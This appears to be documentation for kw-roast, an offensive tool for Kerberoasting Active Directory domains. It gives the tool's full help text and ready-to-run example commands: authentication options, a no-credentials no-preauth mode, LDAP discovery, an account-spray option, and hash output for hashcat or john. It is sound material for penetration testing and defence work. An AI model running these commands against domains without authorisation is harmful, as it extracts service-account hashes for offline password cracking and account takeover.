# kw-roast

TGS-REP Roast (Kerberoast). Request service tickets and extract crackable hashes.

For a full explanation of the attack, authentication methods, and hash formats, see the [guide](../guide/index.md) and [attacks in depth](../guide/attacks.md#tgs-rep-roast-kerberoast).

## Help

```
$ kw-roast -h
usage: kw-roast [-h] [--version] [-v] [--no-preauth USER] [-u USER] [-p PASS]
                [-H HASH] [-k] [-c FILE] [-d DOMAIN] [--dc-ip IP]
                [--dc-hostname HOST] [--transport {tcp,udp}]
                [--timeout TIMEOUT] [-t SPN/USER] [-T FILE] [--ldap]
                [--ldap-all] [--ldap-ssl]
                [-e {des-cbc-crc,des-cbc-md5,rc4,aes128,aes256}] [-o FILE]
                [--format {hashcat,john}]

TGS-REP Roast (Kerberoast) — request service tickets and extract hashes.

options:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
  -v, --verbose         Increase verbosity (-v, -vv)

no-preauth mode (no credentials needed):
  Use a DONT_REQ_PREAUTH account to request service tickets via AS-REQ.

  --no-preauth USER     DONT_REQ_PREAUTH account for AS-REQ kerberoasting

NTLM authentication:
  Authenticate with password or NT hash to request a TGT, then use it for
  TGS requests.

  -u USER, --user USER  Username (sAMAccountName)
  -p PASS, --password PASS
                        Cleartext password
  -H HASH, --hashes HASH
                        NTLM hash — LM:NT, :NT, or NT

Kerberos authentication:
  Authenticate with an existing TGT from a ccache file. Domain and user are
  auto-detected from the ccache.

  -k, --kerberos        Use Kerberos auth via ccache
  -c FILE, --ccache FILE
                        CCache file with TGT (or set KRB5CCNAME)

connection:
  -d DOMAIN, --domain DOMAIN
                        Domain FQDN (auto-detected from ccache with -k)
  --dc-ip IP            DC IP or hostname (resolved via DNS SRV if omitted)
  --dc-hostname HOST    DC FQDN for Kerberos SPN (auto-detected if omitted)
  --transport {tcp,udp}
                        Transport protocol (default: tcp)
  --timeout TIMEOUT     Network timeout in seconds (default: 10)

targets:
  Specify targets manually, or use LDAP discovery (requires authentication).

  -t SPN/USER, --target SPN/USER
                        SPN, sAMAccountName, or UPN (repeatable)
  -T FILE, --targets-file FILE
                        File with targets, one per line (# comments, blank
                        lines skipped)
  --ldap                LDAP: discover accounts with servicePrincipalName set
  --ldap-all            LDAP: try every enabled user (spray)
  --ldap-ssl            Use LDAPS (port 636)

output:
  -e {des-cbc-crc,des-cbc-md5,rc4,aes128,aes256}, --enctype {des-cbc-crc,des-cbc-md5,rc4,aes128,aes256}
                        Encryption type (default: rc4)
  -o FILE, --output FILE
                        Write hashes to file
  --format {hashcat,john}
                        Hash output format (default: hashcat)

Examples:
  kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p pass --ldap
  kw-roast -k -c admin.ccache --ldap
  kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 --no-preauth jsmith -t MSSQLSvc/db01
  kw-roast -d CORP.LOCAL -t svc_sql -t MSSQLSvc/db01.corp.local
```

## Examples

```bash
# LDAP auto-discovery with password auth
kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p 'Password1!' --ldap

# Kerberos auth from ccache (domain auto-detected)
kw-roast -k -c admin.ccache --ldap

# No-preauth kerberoasting (no credentials needed)
kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 --no-preauth vuln_user -t svc_sql

# Specific target, AES256, John format
kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p pass -t MSSQLSvc/db01 -e aes256 --format john
```
